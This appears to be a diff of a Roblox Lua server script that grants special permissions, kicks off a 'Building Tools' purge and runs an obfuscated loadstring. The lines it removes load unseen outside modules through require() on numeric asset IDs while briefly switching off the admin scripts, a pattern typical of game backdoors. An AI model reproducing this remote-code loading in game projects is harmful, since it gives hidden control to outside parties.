@@ -1,4 +1,4 @@
-_G.specialperms = {"schoolgriefer","SnowClan_8342","yx_doomspire"} -- ask to be added
+_G.specialperms = {} -- temporary notice
 
 task.delay(0.5, function()
     local a = game.Workspace.Tabby.Admin_House.Snow
@@ -22,31 +22,9 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
-if game.PlaceId == 14747334292 then
-    local chatcon = {}
-    chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
-        wait(0.94397082108066)
-        chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
-            require(94397082108066)
-            game.ServerScriptService["Touch Kohls Admin"].Enabled = false
-            game.ServerScriptService["setting commands"].Enabled = false
-            wait(0.94397082108066)
-            game.ServerScriptService["Touch Kohls Admin"].Enabled = true
-            game.ServerScriptService["setting commands"].Enabled = true
-            require(100616914257683)
-            for i, v in ipairs(chatcon) do
-                v:Disconnect()
-            end
-        end)
-    end)
-else
-    require(94397082108066)
-    game.ServerScriptService["Touch Kohls Admin"].Enabled = false
-    wait(0.94397082108066)
-    game.ServerScriptService["Touch Kohls Admin"].Enabled = true
-end
-
-_G.shutdowntimer = false
+--task.spawn(function()require(138920906185746)end)
+task.spawn(function() while task.wait()do _G.af = false for a,b in ipairs(game.Players:GetPlayers())do for a,c in ipairs({b.Backpack,b.Character})do if c then for a,d in ipairs(c:GetChildren())do if d:IsA("Tool")and d.Name=="Building Tools"then d:Destroy()end end end end end end end)
+game.StarterPlayer.StarterPlayerScripts.Local.Enabled = false
 
 local timelimit = "08/30/2025"
 
